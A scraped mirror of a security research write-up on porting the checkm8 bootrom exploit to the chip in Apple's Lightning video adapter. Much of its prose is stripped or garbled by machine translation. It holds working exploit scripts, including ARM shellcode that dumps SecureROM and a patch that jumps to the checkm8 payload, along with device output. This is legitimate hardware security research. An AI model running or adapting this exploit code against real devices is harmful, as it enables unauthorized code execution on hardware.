<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë®‚Äçüëß üõï üëò Apple Lightning„Éì„Éá„Ç™„Ç¢„ÉÄ„Éó„Çø„ÅÆcheckm8 üÖ±Ô∏è üë©üèΩ‚Äçü§ù‚Äçüë®üèø üêè</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="checkm8 Apple.   . checkra1n checkm8, iPhone 5s X iOS Cydia .
 

checkm8 SecureROM SRAM. : SecureROM ? , checkm8, - ?
 

, , checkm8. , SecureROM, , c...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Apple Lightning„Éì„Éá„Ç™„Ç¢„ÉÄ„Éó„Çø„ÅÆcheckm8</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/485216/"><div style="text-align:center;"><img width="600" src="https://habrastorage.org/webt/to/xe/wn/toxewnq0zwvkhz4gradawldtdkc.png"></div><br>
<p>  <code>checkm8</code>            Apple.    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">  </a>  .      <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">checkra1n</a>   <code>checkm8</code>,    <code>iPhone</code>  <code>5s</code>  <code>X</code>     <code>iOS</code>   <code>Cydia</code>         .</p><br>
<p><code>checkm8</code>          <code>SecureROM</code>    <code>SRAM</code>.       :     <code>SecureROM</code>  ?       ,    <code>checkm8</code>,  -  ?</p><br>
<p>,        ,     <code>checkm8</code>. ,            <code>SecureROM</code>,   ,   <code>checkm8</code>,        .               <code>W^X</code>.      Lightning- Apple (,      <code>SoC</code>  <code>SecureROM</code>)      <code>SecureROM</code>,      <code>checkm8</code>   .</p><a name="habracut"></a><br>
<h2 id="vvedenie"></h2><br>
<p>  2012- Apple      Lightning:</p><br>
<ul>
<li> AV- Lightning ‚Äî  HDMI,     ;</li>
<li> Lightning/VGA ‚Äî  VGA,    .</li>
</ul><br>
<p>   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> </a>,      <code>SoC</code>   <code>ARM</code> ‚Äî <code>S5L8747</code> (    ,     <code>SoC</code>  ). ,             .  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">The iPhone Wiki</a>,      <code>Haywire</code>,           (,  iPhone)  Lightning.</p><br>
<div style="text-align:center;"><img src="https://habrastorage.org/webt/mc/s5/kc/mcs5kc4rsyjfuox2hrszfqqqpiy.jpeg"></div><br>
<p>    Twitter  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">@nyan_satan</a> (<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">    </a>),            Apple.      ,       USB.</p><br>
<p> <code>SecureROM</code>  <code>SoC</code> <code>S5L8747</code>,     <code>Haywire</code>, ‚Äî <code>1413.8</code>.   ,       <code>checkm8</code>,      <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">ipwndfu</a>      <code>S5L8747</code>.  ,         <code>SecureROM</code>  <code>S5L8747</code>, -      <code>checkm8</code>  <code>Haywire</code>.</p><br>
<p> ,       .   @nyan_satan    , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">  </a>,  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> </a>.     Lightning  Micro-USB   <code>Haywire</code>  ,  ,       (       ) ,      :  ,   ,  USB-,     <code>AMS1117</code>,  Lightning (   ,     ,  <code>Haywire</code>),     .     :</p><br>
<div style="text-align:center;"><img src="https://habrastorage.org/webt/oy/r8/mb/oyr8mbvps-l515ldtfnxr-ndh6k.jpeg"></div><br>
<div style="text-align:center;"><img src="https://habrastorage.org/webt/r_/ky/cu/r_kycubjtuxgg05k9rmck6f_ieq.jpeg"></div><br>
<p>   ,    .       <code>dmesg</code>    ,        :</p><br>
<pre><code class="plaintext hljs">[  167.757532] usb 1-2: new high-speed USB device number 11 using xhci_hcd<font></font>
[  167.888010] usb 1-2: New USB device found, idVendor=05ac, idProduct=1227<font></font>
[  167.888015] usb 1-2: New USB device strings: Mfr=2, Product=3, SerialNumber=4<font></font>
[  167.888017] usb 1-2: Product: Apple Mobile Device (DFU Mode)<font></font>
[  167.888020] usb 1-2: Manufacturer: Apple Inc.<font></font>
[  167.888022] usb 1-2: SerialNumber: CPID:8747 CPRV:10 CPFM:03 SCEP:10 BDID:02 ECID:000002FC9B42B92C IBFL:00 SRTG:[iBoot-1413.8]</code></pre><br>
<h2 id="poisk-neobhodimyh-konstant">  </h2><br>
<p>    ,     ,    <code>checkm8</code>     .      <code>iPhone 7</code>   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">"   checkm8"</a>.   <code>SoC</code>   <code>SecureROM</code>,    ,  <code>S5L8747</code>     <code>SoC S5L8947</code>,   <code>Apple TV</code>  ,         <code>iPhone 7</code>.      <code>iPhone7</code>  <code>Haywire</code>:</p><br>
<ul>
<li>   <code>iPhone 7</code>,   64-  <code>armv8</code>,  <code>Haywire</code> ‚Äî 32- <code>armv7</code>.  ,  <code>Haywire</code>    <code>SecureROM</code>   ,     ( <code>WXN</code> ‚Äî    <code>SCTLR</code>,    ,   ;     <code>MMU</code>).        <code>callback-chain</code> ‚Äî <code>code-reuse</code> ,   <code>iPhone 7</code>.          <code>INSECURE_MEMORY</code>;</li>
<li> <code>SecureROM</code> <code>1704.10</code>         ,      (zero-length-packet)      .   <code>Haywire</code>     <code>heap feng-shui</code>:                  .     :     <code>DFU</code>           ,           ,           .</li>
</ul><br>
<p>   <code>checkm8</code>  <code>Haywire</code>    :</p><br>
<ul>
<li>    ;</li>
<li>      <code>callback</code>   <code>usb_device_io_request</code>.</li>
</ul><br>
<p>      ,     ,     .    ,       (  <code>dmesg -w</code>;        <code>Ubuntu 16.04</code>):      ,           .    ,    .</p><br>
<p>,    <code>checkm8.py</code>     .     <code>USB</code>-      ,   ,    :</p><br>
<ul>
<li><code>large_leak</code> ‚Äî      <code>heap feng-shui</code>;</li>
<li><code>padding</code> ‚Äî   <code>UaF</code>-    <code>usb_device_io_request</code>  ;</li>
<li><code>overwrite</code> ‚Äî ,    <code>usb_device_io_request</code>.</li>
</ul><br>
<div class="spoiler"><b class="spoiler_title">checkm8-brute.py -     </b><div class="spoiler_text"><pre><code class="python hljs"><span class="hljs-keyword">from</span> checkm8 <span class="hljs-keyword">import</span> *<font></font>
<font></font>
<span class="hljs-comment"># make usb_req_* functions more informative</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">libusb1_no_error_ctrl_transfer</span>(<span class="hljs-params">device, bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout</span>):</span>
    <span class="hljs-keyword">try</span>:<font></font>
        device.ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout)<font></font>
    <span class="hljs-keyword">except</span> usb.core.USBError <span class="hljs-keyword">as</span> ex:
        <span class="hljs-keyword">print</span> ex  <span class="hljs-comment"># need for more information</span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">usb_req_stall</span>(<span class="hljs-params">device</span>):</span>   libusb1_no_error_ctrl_transfer(device,  <span class="hljs-number">0x2</span>, <span class="hljs-number">3</span>,   <span class="hljs-number">0x0</span>,  <span class="hljs-number">0x80</span>,  <span class="hljs-number">0x0</span>, <span class="hljs-number">10</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">usb_req_leak</span>(<span class="hljs-params">device</span>):</span>    libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0x80</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0x304</span>, <span class="hljs-number">0x40A</span>, <span class="hljs-number">0x40</span>,  <span class="hljs-number">1</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">usb_req_no_leak</span>(<span class="hljs-params">device</span>):</span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0x80</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0x304</span>, <span class="hljs-number">0x40A</span>, <span class="hljs-number">0x41</span>,  <span class="hljs-number">1</span>)<font></font>
<font></font>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<font></font>
    device = dfu.acquire_device()<font></font>
    start = time.time()<font></font>
    <span class="hljs-keyword">print</span> <span class="hljs-string">'Found:'</span>, device.serial_number<font></font>
<font></font>
    <span class="hljs-comment"># unknown values, need to brute</span>
    large_leak = <span class="hljs-number">100</span>
    padding = <span class="hljs-number">0x7c0</span>
    overwrite = <span class="hljs-string">''</span>
    payload = <span class="hljs-string">''</span>
    <span class="hljs-keyword">assert</span> len(overwrite) + padding &lt;= <span class="hljs-number">0x800</span><font></font>
<font></font>
    <span class="hljs-comment"># heap feng-shui</span><font></font>
    usb_req_stall(device)<font></font>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(large_leak):<font></font>
        usb_req_leak(device)<font></font>
    usb_req_no_leak(device)<font></font>
    dfu.usb_reset(device)<font></font>
    dfu.release_device(device)<font></font>
<font></font>
    <span class="hljs-comment"># set global state and restart usb</span><font></font>
    device = dfu.acquire_device()<font></font>
    device.serial_number<font></font>
    libusb1_async_ctrl_transfer(device, <span class="hljs-number">0x21</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">'A'</span> * <span class="hljs-number">0x800</span>, <span class="hljs-number">0.0001</span>)<font></font>
    libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0x21</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<font></font>
    dfu.release_device(device)<font></font>
<font></font>
    time.sleep(<span class="hljs-number">0.5</span>)<font></font>
<font></font>
    <span class="hljs-comment"># heap occupation</span><font></font>
    device = dfu.acquire_device()<font></font>
    usb_req_stall(device)<font></font>
    usb_req_leak(device)<font></font>
    libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">'A'</span> * padding + overwrite, <span class="hljs-number">100</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(payload), <span class="hljs-number">0x800</span>):<font></font>
        libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0x21</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, payload[i:i+<span class="hljs-number">0x800</span>], <span class="hljs-number">100</span>)<font></font>
    dfu.usb_reset(device)<font></font>
    dfu.release_device(device)<font></font>
<font></font>
    device = dfu.acquire_device()<font></font>
    <span class="hljs-keyword">print</span> <span class="hljs-string">'(%0.2f seconds)'</span> % (time.time() - start)<font></font>
    dfu.release_device(device)</code></pre></div></div><br>
<p>   ,    <code>heap feng-shui</code>       <code>[Errno 110] Operation timed out</code>  <code>[Errno 19] No such device (it may have been disconnected)</code>.   ,     <code>Haywire</code>  ,    <code>iPhone</code>,   100        . ,       <code>large_leak</code>.      45- ,  ,   .</p><br>
<div style="text-align:center;"><img src="https://habrastorage.org/webt/g4/a6/mw/g4a6mwekn2ryyxnjibiteyhkyus.png"></div><br>
<p>  43   <code>dmesg -w</code>       .    <code>Wireshark</code>  <code>USB</code>-,  ,     .</p><br>
<div style="text-align:center;"><img src="https://habrastorage.org/webt/uo/tn/ll/uotnlli6_utwohjwzfqscc_a5ic.png"></div><br>
<p> ,     , ,    <code>padding</code>  <code>overwrite</code>,      .   43 ‚Äî  0x7a0, -   <code>usb_device_io_request</code>    <code>UaF</code>-,     <code>large_leak</code>.        <code>large_leak = 41</code>     <code>0x6e0</code>.   ,      <code>overwrite = '\x09\x02\xff'</code>.  <code>Wireshark</code>     ( 25     255):</p><br>
<div style="text-align:center;"><img src="https://habrastorage.org/webt/l2/ru/6x/l2ru6xkjgzn8oc5xrei8uz-w71s.png"></div><br>
<p>  (    )  ,    .  <code>padding</code>   <code>usb_device_io_request</code>  : <code>0x6e0</code> (    ) + <code>0x20</code> (       ) + <code>0x40</code> (     ) + <code>0x20</code> (    <code>usb_device_io_request</code>) = <code>0x760</code>.</p><br>
<p>      . ,             .        <code>iBoot</code>,       :    ,     <code>SoC S5L8747</code> ‚Äî <code>0x22000000</code>.    ,            :</p><br>
<pre><code class="python hljs">large_leak = <span class="hljs-number">41</span>
padding = <span class="hljs-number">0x760</span>
overwrite = struct.pack(<span class="hljs-string">'&lt;20xI'</span>, <span class="hljs-number">0x22000000</span>)<font></font>
payload = <span class="hljs-string">'\xfe\xff\xff\xea'</span>  <span class="hljs-comment"># armv7 inf-loop</span></code></pre><br>
<p>  <code>USB</code>-      ,    <code>dmesg</code>      :</p><br>
<pre><code class="plaintext hljs">[ 3097.066887] usb 1-2: SerialNumber: CPID:8747 CPRV:10 CPFM:03 SCEP:10 BDID:02 ECID:000002FC9B42B92C IBFL:00 SRTG:[iBoot-1413.8]<font></font>
[ 3097.384557] usb 1-2: reset high-speed USB device number 98 using xhci_hcd<font></font>
[ 3102.497002] usb 1-2: device descriptor read/64, error -110<font></font>
[ 3117.714855] usb 1-2: device descriptor read/64, error -110<font></font>
[ 3117.930756] usb 1-2: reset high-speed USB device number 98 using xhci_hcd<font></font>
[ 3123.043369] usb 1-2: device descriptor read/64, error -110<font></font>
[ 3138.261119] usb 1-2: device descriptor read/64, error -110<font></font>
[ 3138.477092] usb 1-2: reset high-speed USB device number 98 using xhci_hcd<font></font>
[ 3143.493674] xhci_hcd 0000:00:14.0: Timeout while waiting for setup device command<font></font>
[ 3143.697698] usb 1-2: Device not responding to setup address.<font></font>
[ 3143.901633] usb 1-2: device not accepting address 98, error -71<font></font>
[ 3144.013617] usb 1-2: reset high-speed USB device number 98 using xhci_hcd</code></pre><br>
<p>    <code>USB</code>- -   .  ,        <code>SecureROM</code>  Lightning- Apple,        .</p><br>
<h2 id="izvlechenie-securerom-haywire"> SecureROM Haywire</h2><br>
<p>  <code>SecureROM</code>   ,             .      ,      <code>Apple Mobile Device (DFU Mode)</code>.     :      ,  ‚Äî  ,       <code>UTF-16-LE</code>.             <code>0xff</code>,      <code>0xfd</code>  (..        ).   <code>usb_device_io_request</code>          (           ).   :</p><br>
<div class="spoiler"><b class="spoiler_title">checkm8-leak.py -    </b><div class="spoiler_text"><pre><code class="python hljs"><span class="hljs-keyword">from</span> checkm8 <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> keystone <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> hexdump <span class="hljs-keyword">import</span> *<font></font>
<font></font>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<font></font>
    device = dfu.acquire_device()<font></font>
    start = time.time()<font></font>
    <span class="hljs-keyword">print</span> <span class="hljs-string">'Found:'</span>, device.serial_number<font></font>
<font></font>
    <span class="hljs-comment"># unknown values, need to brute</span>
    large_leak = <span class="hljs-number">41</span>
    padding = <span class="hljs-number">0x6e0</span>
    conf_desc = <span class="hljs-string">'0902190001010580320904000000fe01'</span>\
                <span class="hljs-string">'00000721010a00000800000000000000'</span>.decode(<span class="hljs-string">'hex'</span>)<font></font>
    chunk_meta = <span class="hljs-string">'08000000020000000000000000000000'</span>\
                 <span class="hljs-string">'00000000000000000000000000000000'</span>.decode(<span class="hljs-string">'hex'</span>)  <font></font>
    overwrite = conf_desc + chunk_meta + conf_desc + chunk_meta +\<font></font>
        struct.pack(<span class="hljs-string">'&lt;20xI'</span>, <span class="hljs-number">0x22000000</span>)
    <span class="hljs-keyword">assert</span> len(overwrite) + padding &lt;= <span class="hljs-number">0x800</span><font></font>
<font></font>
    payload = <span class="hljs-string">'''
        push {r1-r7,lr}

        ldr r4, =0x2201c000
        mov r5, r4

        pattern_matching_loop:
        sub r4, r4, #1

        mov r0, #0
        adr r1, ptrn

        compare_loop:
        add r2, r4, r0, lsl #1
        cmp r2, r5
        bge pattern_matching_loop

        ldrb r3, [r1,r0]
        ldrb r6, [r2]
        cmp r3, r6
        bne pattern_matching_loop
        add r0, r0, #1
        cmp r0, #30
        beq found
        b compare_loop

        found:
        mov r0, #0xff
        strb r0, [r4, #-0x2]

        mov r0, #0
        mov r1, r4
        ldr r2, =0x200 # target address

        rewrite_loop:
        ldrb r3, [r2,r0]
        strb r3, [r1,r0]
        add r0, r0, #1
        cmp r0, #0xfd
        ble rewrite_loop

        pop {r1-r7,pc}

        ptrn:
        .asciz "Apple Mobile Device (DFU Mode)"
    '''</span><font></font>
<font></font>
    ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)<font></font>
    payload, _ = ks.asm(payload)<font></font>
    payload = <span class="hljs-string">''</span>.join(chr(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload)<font></font>
<font></font>
    <span class="hljs-comment"># heap feng-shui</span><font></font>
    usb_req_stall(device)<font></font>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(large_leak):<font></font>
        usb_req_leak(device)<font></font>
    usb_req_no_leak(device)<font></font>
    dfu.usb_reset(device)<font></font>
    dfu.release_device(device)<font></font>
<font></font>
    <span class="hljs-comment"># set global state and restart usb</span><font></font>
    device = dfu.acquire_device()<font></font>
    device.serial_number<font></font>
    libusb1_async_ctrl_transfer(device, <span class="hljs-number">0x21</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">'A'</span> * <span class="hljs-number">0x800</span>, <span class="hljs-number">0.0001</span>)<font></font>
    libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0x21</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<font></font>
    dfu.release_device(device)<font></font>
<font></font>
    time.sleep(<span class="hljs-number">0.5</span>)<font></font>
<font></font>
    <span class="hljs-comment"># heap occupation</span><font></font>
    device = dfu.acquire_device()<font></font>
    usb_req_stall(device)<font></font>
    usb_req_leak(device)<font></font>
    libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">'\0'</span> * padding + overwrite, <span class="hljs-number">100</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(payload), <span class="hljs-number">0x800</span>):<font></font>
        libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0x21</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, payload[i:i+<span class="hljs-number">0x800</span>], <span class="hljs-number">100</span>)<font></font>
    dfu.usb_reset(device)<font></font>
    dfu.release_device(device)<font></font>
<font></font>
    device = dfu.acquire_device()<font></font>
    <span class="hljs-keyword">print</span> <span class="hljs-string">'(%0.2f seconds)'</span> % (time.time() - start)<font></font>
    desc =  device.ctrl_transfer(<span class="hljs-number">0x80</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0x303</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">50</span>)<font></font>
    leak = <span class="hljs-string">''</span>.join(chr(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> desc)[<span class="hljs-number">2</span>:]<font></font>
    hexdump(leak)<font></font>
    dfu.release_device(device)</code></pre></div></div><br>
<p>       <code>0x200</code>,           <code>SecureROM</code>.     :</p><br>
<pre><code class="plaintext hljs"># python ./checkm8-leak.py<font></font>
Found: CPID:8747 CPRV:10 CPFM:03 SCEP:10 BDID:02 ECID:000002FC9B42B92C IBFL:00 SRTG:[iBoot-1413.8]<font></font>
(1.26 seconds)<font></font>
00000000: 53 65 63 75 72 65 52 4F  4D 20 66 6F 72 20 73 35  SecureROM for s5<font></font>
00000010: 6C 38 37 34 37 78 73 69  2C 20 43 6F 70 79 72 69  l8747xsi, Copyri<font></font>
00000020: 67 68 74 20 32 30 31 31  2C 20 41 70 70 6C 65 20  ght 2011, Apple<font></font>
00000030: 49 6E 63 2E 00 00 00 00  00 00 00 00 00 00 00 00  Inc.............<font></font>
00000040: 52 45 4C 45 41 53 45 00  00 00 00 00 00 00 00 00  RELEASE.........<font></font>
00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
00000080: 69 42 6F 6F 74 2D 31 34  31 33 2E 38 00 00 00 00  iBoot-1413.8....<font></font>
00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
000000C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
000000D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
000000E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................<font></font>
000000F0: 00 00 00 00 00 00 00 00  00 00 00 00 00           .............</code></pre><br>
<p>  ,     <code>SecureROM</code>.   ,  <code>Haywire</code>     <code>DFU</code>,     ,       .           <code>checkm8</code>  <code>Haywire</code>.</p><br>
<h2 id="portirovanie-checkm8-na-haywire"> checkm8  Haywire</h2><br>
<p>        <code>SecureROM</code> ,   <code>checkm8</code>  ,  <code>SecureROM</code>,   <code>Haywire</code>.      ,     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>.  ,  ,     ,   ,     <code>pwned-DFU</code> . ,     :         .     ,  ,   <code>large_leak</code>,   ‚Äî        .            ,         <code>checkm8</code>.     :</p><br>
<pre><code class="plaintext hljs">   push {r1-r7,lr}<font></font>
   ldr r4, =0x2201b4e0  # leaked requests address<font></font>
   mov r5, #0<font></font>
   ldr r6, =0x361c # free function<font></font>
   add r6, r6, #1<font></font>
   # we need more free space, so clear leaked requests<font></font>
loop:<font></font>
   add r0, r4, r5<font></font>
   blx r6<font></font>
   add r5, r5, #0x40<font></font>
   cmp r5, #0x780<font></font>
   bne loop<font></font>
<font></font>
   # restore original chunk meta-data<font></font>
   ldr r4, =0x2201b340  # second conf descriptor chunk header<font></font>
   ldr r0, =0x00000008  # original chunk header values<font></font>
   ldr r1, =0x00000002<font></font>
   str r0, [r4]<font></font>
   str r1, [r4, #4]<font></font>
   pop {r1-r7,lr}<font></font>
   ldr r0, =0x22000000<font></font>
   bx r0  # jump to checkm8 payload</code></pre><br>
<p>       ,   ,         ,     .</p><br>
<p>    <code>checkm8</code>    :    ,       .   ,   <code>ipwndfu</code>,           <code>GID</code>-       <code>Haywire</code>    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">xpwntool</a>:</p><br>
<div style="text-align:center;"><img src="https://habrastorage.org/webt/xv/66/yx/xv66yx8p_9d1lqukg7idzi4jpj4.png"></div><br>
<h2 id="vyvod"></h2><br>
<p>     <code>SecureROM</code>        ,      . ,        ,    ,       .   <code>Apple</code>,    32-  <code>armv7</code>. <code>checkm8</code>     ,   <code>Haywire</code>,         .</p><br>
<p>      <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">ipwndfu-haywire</a>.</p><br>
<p>,       <code>SecureROM</code>, -   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><code> DOOM</code></a>    <code>Haywire</code>.</p><br>
<p>,      .        <code>Apple</code>    <code>checkm8</code>,            .</p><br>
<p><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a> </p><br>
<h2 id="ssylki"></h2><br>
<ol>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">   checkm8</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Luca Todesco, The One Weird Trick SecureROM Hates</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">checkra1n</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Panic Blog, The Lightning Digital AV Adapter Surprise</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">The iPhone Wiki, Haywire</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">@nyan_satan, Haywire</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Habr,    Apple Lightning</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">ipwndfu</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">ipwndfu-haywire</a></li>
</ol></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja485204/index.html">„Éà„ÉÉ„Éó„Å´Êàª„ÇãÔºöAmazon„ÅÆË≥áÊú¨Èáë„Åå„Åæ„ÇÇ„Å™„Åè1ÂÖÜ„Éâ„É´„ÇíË∂Ö„Åà„ÇãÁêÜÁî±</a></li>
